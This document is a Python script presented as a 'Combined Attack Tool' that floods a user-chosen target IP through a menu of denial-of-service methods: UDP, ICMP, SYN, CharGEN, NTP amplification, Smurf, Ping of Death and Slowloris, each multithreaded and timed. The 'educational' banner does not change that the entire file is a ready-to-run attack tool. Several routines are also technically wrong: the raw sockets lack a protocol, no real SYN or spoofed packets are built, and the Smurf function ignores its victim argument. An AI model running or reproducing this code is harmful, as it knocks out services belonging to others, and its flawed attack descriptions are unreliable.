import os
import sys
import socket
import random
import time
from termcolor import colored
from threading import Thread, Lock

# Banner anzeigen
def show_banner():
    os.system("clear")
    print(colored("""
    █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║  ██║
   ███████║   ██║      ██║   ███████║██║     ███████║
   ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔══██║
   ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██║
   ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
    """, "red"))
    print(colored("*******************************************", "yellow"))
    print(colored("*            Combined Attack Tool         *", "yellow"))
    print(colored("*         Created for Educational Use     *", "yellow"))
    print(colored("*******************************************", "yellow"))
    print(colored("Author: Educational Example", "green"))
    print(colored("Usage of this tool must comply with all laws.", "blue"))
    print()

# Zielinformationen abrufen
def get_target_info():
    ip = input(colored("Enter target IP: ", "cyan"))
    port = int(input(colored("Enter target port (0 if not applicable): ", "cyan")))
    duration = int(input(colored("Enter attack duration (seconds): ", "cyan")))
    return ip, port, duration

# Anzahl der Threads abrufen
def get_threads():
    threads = int(input(colored("Enter number of threads (Max: 100): ", "cyan")))
    return min(threads, 100)

# Universelle Angriffsfunktion
def execute_attack(ip, port, duration, threads, attack_type, payload=None):
    lock = Lock()
    stats = {"packets_sent": 0}

    def attack():
        nonlocal stats
        sock_type = socket.SOCK_DGRAM if attack_type in ["udp", "chargen"] else socket.SOCK_RAW
        sock = socket.socket(socket.AF_INET, sock_type)
        timeout = time.time() + duration

        while time.time() < timeout:
            try:
                data = payload or random._urandom(1024)
                sock.sendto(data, (ip, port))
                with lock:
                    stats["packets_sent"] += 1
            except Exception:
                continue

    print(colored(f"Starting {attack_type.upper()} attack on {ip}:{port}", "yellow"))
    threads_list = [Thread(target=attack) for _ in range(threads)]
    for thread in threads_list:
        thread.start()

    while any(thread.is_alive() for thread in threads_list):
        with lock:
            print(colored(f"Packets sent: {stats['packets_sent']}", "cyan"), end="\r")
        time.sleep(1)

    for thread in threads_list:
        thread.join()
    print(colored(f"\n{attack_type.upper()} attack completed.", "green"))

# Spezifische Angriffe
def icmp_flood(ip, duration, threads):
    execute_attack(ip, 0, duration, threads, "icmp", b"\x08\x00" + random._urandom(32))

def syn_flood(ip, port, duration, threads):
    execute_attack(ip, port, duration, threads, "syn", random._urandom(1024))

def ntp_amplification(ip, duration, threads):
    execute_attack(ip, 123, duration, threads, "ntp", b'\x17\x00\x03\x2a')

def smurf_attack(ip, broadcast_ip, duration, threads):
    execute_attack(broadcast_ip, 0, duration, threads, "smurf", b'\x08\x00' + random._urandom(32))

def ping_of_death(ip, duration, threads):
    execute_attack(ip, 0, duration, threads, "ping_of_death", b'\x08\x00' + random._urandom(65500))

def slowloris(ip, port, duration, threads):
    lock = Lock()
    stats = {"connections_made": 0}

    def attack():
        nonlocal stats
        timeout = time.time() + duration
        headers = f"GET / HTTP/1.1\r\nHost: {ip}\r\nConnection: keep-alive\r\n"

        while time.time() < timeout:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip, port))
                sock.send(headers.encode('utf-8'))
                with lock:
                    stats["connections_made"] += 1
                time.sleep(random.uniform(5, 15))  # Send partial headers periodically
            except Exception:
                continue

    print(colored(f"Starting Slowloris attack on {ip}:{port}", "yellow"))
    threads_list = [Thread(target=attack) for _ in range(threads)]
    for thread in threads_list:
        thread.start()

    while any(thread.is_alive() for thread in threads_list):
        with lock:
            print(colored(f"Connections made: {stats['connections_made']}", "cyan"), end="\r")
        time.sleep(1)

    for thread in threads_list:
        thread.join()
    print(colored(f"\nSlowloris attack completed.", "green"))

# Hauptmenü
def main():
    while True:
        show_banner()
        print("1. UDP Flood")
        print("2. ICMP Flood")
        print("3. SYN Flood")
        print("4. CharGEN Flood")
        print("5. NTP Amplification")
        print("6. Smurf Attack")
        print("7. Ping of Death")
        print("8. Slowloris")
        print("9. Exit")

        choice = input(colored("Select an option: ", "cyan"))

        if choice in ["1", "2", "3", "4", "5", "6", "7", "8"]:
            ip, port, duration = get_target_info()
            threads = get_threads()

            if choice == "1":
                execute_attack(ip, port, duration, threads, "udp")
            elif choice == "2":
                icmp_flood(ip, duration, threads)
            elif choice == "3":
                syn_flood(ip, port, duration, threads)
            elif choice == "4":
                execute_attack(ip, port, duration, threads, "chargen", b"CharGEN Flood Payload")
            elif choice == "5":
                ntp_amplification(ip, duration, threads)
            elif choice == "6":
                broadcast_ip = input(colored("Enter broadcast IP: ", "cyan"))
                smurf_attack(ip, broadcast_ip, duration, threads)
            elif choice == "7":
                ping_of_death(ip, duration, threads)
            elif choice == "8":
                slowloris(ip, port, duration, threads)
        elif choice == "9":
            print(colored("Exiting... Goodbye!", "red"))
            sys.exit()
        else:
            print(colored("Invalid choice. Please try again.", "red"))

if __name__ == "__main__":
    main()
